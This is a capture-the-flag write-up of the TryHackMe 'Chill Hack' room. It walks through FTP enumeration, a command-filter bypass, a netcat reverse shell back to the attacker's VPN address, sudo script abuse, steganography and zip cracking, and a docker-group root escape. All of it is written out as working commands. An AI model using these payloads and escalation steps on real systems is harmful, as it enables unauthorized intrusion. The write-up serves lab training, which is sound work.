# Tryhackme ChillHack Room

***Chill the Hack out of the Machine.***

*Easy level CTF.  Capture the flags and have fun!*

![cover.png](Tryhackme%20ChillHack%20Room%206eb8ce85ee0f4889b064e4d65b678c03/cover.png)

Let’s start with an nmap scan

```bash
nmap -sVSC -Pn 10.10.206.163 --min-rate=1000 -oN nmap-scan
Nmap scan report for 10.10.206.163
Host is up (0.20s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.110.7
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Game Info
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.57 seconds
```

After the nmap scan we found out there are 3 open ports 

- 21 FTP — which allows Anonymous login
- 22 SSH
- 80 HTTP

since FTP allows Anonymous login. Let’s login to check what’s on it

```bash
➜ ftp 10.10.206.163
Connected to 10.10.206.163.
220 (vsFTPd 3.0.3)
Name (10.10.206.163:l33): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

So, we are logged in successfully.

```bash
ftp> ls
229 Entering Extended Passive Mode (|||33253|)
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||57801|)
150 Opening BINARY mode data connection for note.txt (90 bytes).
100% |*************************************************|    90      935.00 KiB/s    00:00 ETA
226 Transfer complete.
90 bytes received in 00:00 (0.34 KiB/s)
ftp> exit
221 Goodbye.
```

There is a file of the FTP sever. Lets read the content of the note.txt

```bash
➜  cat note.txt 
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

There is also an apache web server running on port 80. But visiting site ip through browser didn’t give anything juicy.

We will therefore **enumerate** the latter using the ******************dirsearch****************** tool:

```bash
dirsearch -u 10.10.29.87 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php,txt

  _|. _ _  _  _  _ _|_    v0.4.2                                                              
 (_||| _) (/_(_|| (_| )                                                                       
                                                                                              
Extensions: php, txt | HTTP method: GET | Threads: 30 | Wordlist size: 220545

Output File: /home/l33/.dirsearch/reports/10.10.29.87_23-10-14_18-40-20.txt

Error Log: /home/l33/.dirsearch/logs/errors-23-10-14_18-40-20.log

Target: http://10.10.29.87/

[18:40:21] Starting: 
[18:40:23] 301 -  311B  - /images  ->  http://10.10.29.87/images/
[18:40:32] 301 -  308B  - /css  ->  http://10.10.29.87/css/                
[18:40:39] 301 -  307B  - /js  ->  http://10.10.29.87/js/                  
[18:41:10] 301 -  310B  - /fonts  ->  http://10.10.29.87/fonts/            
[18:41:50] 301 -  311B  - /secret  ->  http://10.10.29.87/secret/
```

**A secret** file is present on the website:

![Screenshot from 2023-10-14 18-50-10.png](Tryhackme%20ChillHack%20Room%206eb8ce85ee0f4889b064e4d65b678c03/Screenshot_from_2023-10-14_18-50-10.png)

It seems that we can execute system commands , however some commands as we saw previously are blocked .

![Untitled](Tryhackme%20ChillHack%20Room%206eb8ce85ee0f4889b064e4d65b678c03/Untitled.png)

hmmm! Take a look at the “**note.txt**’ above, I know that the command input here will be filtered and only allows specific command to be executed.

Let’s try bypass this filter. First, I’ll use “**\**” so the command will be “**l\s -al**”:

![Untitled](Tryhackme%20ChillHack%20Room%206eb8ce85ee0f4889b064e4d65b678c03/Untitled%201.png)

it works! So now we can read the content of “**index.php**” using c\a\t:

![Untitled](Tryhackme%20ChillHack%20Room%206eb8ce85ee0f4889b064e4d65b678c03/Untitled%202.png)

Notices there’s a change in the web-page and decided to check the source the code

![Untitled](Tryhackme%20ChillHack%20Room%206eb8ce85ee0f4889b064e4d65b678c03/Untitled%203.png)

From the source code i can see that some commands are blacklisted. Many of them can be used to spawn a reverse shell.

i tried to spawn a reverse shell using it’s full path. 

i started a listtener on my machine and pasted my reverse shell payload into the comand parameter

```jsx
nc -nlvp 1990
listening on [any] 1990 ...
connect to [YOUR VPN IP] from (UNKNOWN) [YOUR VPN IP] 52466
```

```jsx
/bin/rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc YOUR VPN IP 1990 >/tmp/f
```

******************************BOOM!!1 we got a shell******************************

```jsx
nc -nlvp 1990
listening on [any] 1990 ...
connect to [10.8.110.7] from (UNKNOWN) [10.10.29.87] 52466
sh: 0: can't access tty; job control turned off
$ ls
images
index.php
```

it’s time for us to stabilize our shell

```jsx
STEP 1****************************************:
pyhton3 -c 'import pty;pty.spawn ("/bin/bash")'

STEP 2:
Press CTRL + Z to background process and get back to your host machine

STEP 3:
stty raw -echo; fg

STEP 4:
export TERM=xterm****************************************
```

we got a shell as www-data and we need to escalate our privilege

```jsx
www-data@ubuntu:/var/www/html/secret$ ls
images  index.php
www-data@ubuntu:/var/www/html/secret$ cd images
www-data@ubuntu:/var/www/html/secret/images$ ls
FailingMiserableEwe-size_restricted.gif  blue_boy_typing_nothought.gif
```

we use sudo -l to check the sudoers

```jsx
www-data@ubuntu:/home$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

let’s read the contents of the script

```jsx
www-data@ubuntu:/home/apaar$ cat .helpline.sh 
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"

```

so the “message” input will be passed right to the #!/bin/bash, which can be used to spawn a new shell for me as “apaar”. So let’s run this script again, but this time, input the msg as “/bin/bash

```jsx
www-data@ubuntu:/$ sudo -u apaar /home/apaar/.helpline.sh 

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: apaar
Hello user! I am apaar,  Please enter your message: /bin/sh
id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
```

we got another shell as apaar. let’s stabilize the shell we just got

```jsx
STEP 1:
pyhton3 -c 'import pty;pty.spawn ("/bin/bash")'

STEP 2:
Press CTRL + Z to background process and get back to your host machine

STEP 3:
stty raw -echo; fg

STEP 4:
export TERM=xterm
```

after our shell hae been stabilized we now have access to read local .txt

```jsx
apaar@ubuntu:~$ cat local.txt 
{USER-FLAG: *******************************}
apaar@ubuntu:~$
```

A machine with webserver can highly be vulnerable to information leaked in “**/var/www/”**. Let’s **cd** to this folder to look for sensitive information.

```bash
apaar@ubuntu:/var/www$ ls
files  html
apaar@ubuntu:/var/www$ cd files
apaar@ubuntu:/var/www/files$ ls
account.php  hacker.php  images  index.php  style.css
apaar@ubuntu:/var/www/files$
```

```bash
apaar@ubuntu:/var/www/files$ cat hacker.php 
<html>
<head>
<body>
<style>
body {
  background-image: url('images/002d7e638fb463fb7a266f5ffc7ac47d.gif');
}
h2
{
        color:red;
        font-weight: bold;
}
h1
{
        color: yellow;
        font-weight: bold;
}
</style>
<center>
        <img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
        <h1 style="background-color:red;">You have reached this far. </h2>
        <h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
</center>
</head>
</html>
apaar@ubuntu:/var/www/files$
```

I downloaded the jpg to my machine and ran it through steghide:

```bash
wget http://10.10.186.200:8009/002d7e638fb463fb7a266f5ffc7ac47d.gif                
--2023-10-14 20:22:23--  http://10.10.186.200:8009/002d7e638fb463fb7a266f5ffc7ac47d.gif
Connecting to 10.10.186.200:8009... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2083694 (2.0M) [image/gif]
Saving to: ‘002d7e638fb463fb7a266f5ffc7ac47d.gif’

002d7e638fb463fb7a266f5 100%[=============================>]   1.99M   739KB/s    in 2.8s    

2023-10-14 20:22:26 (739 KB/s) - ‘002d7e638fb463fb7a266f5ffc7ac47d.gif’ saved [2083694/2083694]

➜  ~ wget http://10.10.186.200:8009/hacker-with-laptop_23-2147985341.jpg           
--2023-10-14 20:22:51--  http://10.10.186.200:8009/hacker-with-laptop_23-2147985341.jpg
Connecting to 10.10.186.200:8009... connected.
HTTP request sent, awaiting response... 200 OK
Length: 68841 (67K) [image/jpeg]
Saving to: ‘hacker-with-laptop_23-2147985341.jpg’

hacker-with-laptop_23-2 100%[=============================>]  67.23K   165KB/s    in 0.4s    

2023-10-14 20:22:52 (165 KB/s) - ‘hacker-with-laptop_23-2147985341.jpg’ saved [68841/68841]
```

i decided to run stegide on the .jpg file

```bash
steghide extract -sf hacker-with-laptop_23-2147985341.jpg 
Enter passphrase: 
wrote extracted data to "backup.zip".
```

we got a .zip file. let’s try to extract the contents of the zip file

```bash
➜  chill-hack unzip backup.zip 
Archive:  backup.zip
[backup.zip] source_code.php password:
```

i use fcrackzip to crack the passowrd

```bash
chill-hack fcrackzip --u -D -p /usr/share/wordlists/rockyou.txt backup.zip 

PASSWORD FOUND!!!!: pw == pass1word
```

we now havea password to unzip backup.zip

```bash
unzip backup.zip 
Archive:  backup.zip
[backup.zip] source_code.php password: 
  inflating: source_code.php
```

from backup.zip we got another file source_code.php. lets read the contents of te file

```bash
➜  chill-hack cat source_code.php 
<html>
<head>
        Admin Portal
</head>
        <title> Site Under Development ... </title>
        <body>
                <form method="POST">
                        Username: <input type="text" name="name" placeholder="username"><br><br>
                        Email: <input type="email" name="email" placeholder="email"><br><br>
                        Password: <input type="password" name="password" placeholder="password">
                        <input type="submit" name="submit" value="Submit"> 
                </form>
<?php
        if(isset($_POST['submit']))
        {
                $email = $_POST["email"];
                $password = $_POST["password"];
                if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
                { 
                        $random = rand(1000,9999);?><br><br><br>
                        <form method="POST">
                                Enter the OTP: <input type="number" name="otp">
                                <input type="submit" name="submitOtp" value="Submit">
                        </form>
                <?php   mail($email,"OTP for authentication",$random);
                        if(isset($_POST["submitOtp"]))
                                {
                                        $otp = $_POST["otp"];
                                        if($otp == $random)
                                        {
                                                echo "Welcome Anurodh!";
                                                header("Location: authenticated.php");
                                        }
                                        else
                                        {
                                                echo "Invalid OTP";
                                        }
                                }
                }
                else
                {
                        echo "Invalid Username or Password";
                }
        }
?>
</html>
```

i got a password that is in base64 and decided to decode it

```bash
➜  chill-hack echo 'IWQwbnRLbjB3bVlwQHNzdzByZA==' | base64 -d
!d0ntKn0wmYp@ssw0rd
```

i used the password to login into the ssh server

```bash
➜  chill-hack ssh anurodh@10.10.186.200
anurodh@10.10.186.200's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Oct 15 00:46:03 UTC 2023

  System load:  0.0                Processes:              123
  Usage of /:   24.9% of 18.57GB   Users logged in:        0
  Memory usage: 29%                IP address for eth0:    10.10.186.200
  Swap usage:   0%                 IP address for docker0: 172.17.0.1

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

19 packages can be updated.
0 updates are security updates.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
```

i checked the sudoers file but i can use it to escalate privilege so i decided to upload linpeas to my target and ran linpeas on the target

```bash
anurodh@ubuntu:~$ ./linpeas.sh 

                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------\
    |                             Do you like PEASS?                            |             
    |---------------------------------------------------------------------------|             
    |         Become a Patreon    :     https://www.patreon.com/peass           |             
    |         Follow on Twitter   :     @carlospolopm                           |             
    |         Respect on HTB      :     SirBroccoli                             |             
    |---------------------------------------------------------------------------|             
    |                                 Thank you!                                |             
    \---------------------------------------------------------------------------/             
          linpeas-ng by carlospolop                                                           
                                                                                              
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.
                                                                                              
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist                                                                                        
 LEGEND:                                                                                      
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...
```

it shows that i can escalate privilege using docker since the docker is writable

```bash
/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request
Docker socket /var/run/docker.sock is writable (https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket)
```

i used docker from gtfobins to escalate privilege

[https://gtfobins.github.io/gtfobins/docker/](https://gtfobins.github.io/gtfobins/docker/)

```bash
anurodh@ubuntu:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```

```bash
root@60d523756f1e:~# cat proof.txt 

                                        {ROOT-FLAG: ********************************}

Congratulations! You have successfully completed the challenge.

         ,-.-.     ,----.                                             _,.---._    .-._           ,----.  
,-..-.-./  \==\ ,-.--` , \   _.-.      _.-.             _,..---._   ,-.' , -  `. /==/ \  .-._ ,-.--` , \ 
|, \=/\=|- |==||==|-  _.-` .-,.'|    .-,.'|           /==/,   -  \ /==/_,  ,  - \|==|, \/ /, /==|-  _.-` 
|- |/ |/ , /==/|==|   `.-.|==|, |   |==|, |           |==|   _   _\==|   .=.     |==|-  \|  ||==|   `.-. 
 \, ,     _|==/==/_ ,    /|==|- |   |==|- |           |==|  .=.   |==|_ : ;=:  - |==| ,  | -/==/_ ,    / 
 | -  -  , |==|==|    .-' |==|, |   |==|, |           |==|,|   | -|==| , '='     |==| -   _ |==|    .-'  
  \  ,  - /==/|==|_  ,`-._|==|- `-._|==|- `-._        |==|  '='   /\==\ -    ,_ /|==|  /\ , |==|_  ,`-._ 
  |-  /\ /==/ /==/ ,     //==/ - , ,/==/ - , ,/       |==|-,   _`/  '.='. -   .' /==/, | |- /==/ ,     / 
  `--`  `--`  `--`-----`` `--`-----'`--`-----'        `-.`.____.'     `--`--''   `--`./  `--`--`-----``  

--------------------------------------------Designed By -------------------------------------------------------
                                        |  Anurodh Acharya |
                                        ---------------------

                                     Let me know if you liked it.

Twitter
        - @acharya_anurodh
Linkedin
        - www.linkedin.com/in/anurodh-acharya-b1937116a

root@60d523756f1e:~#
```

Thank you for reading this write-up!

### Created by ****shayolee(THM) sHayo_l33(x foemrly twitter)**** [https://twitter.com/shayo_l33](https://twitter.com/shayo_l33)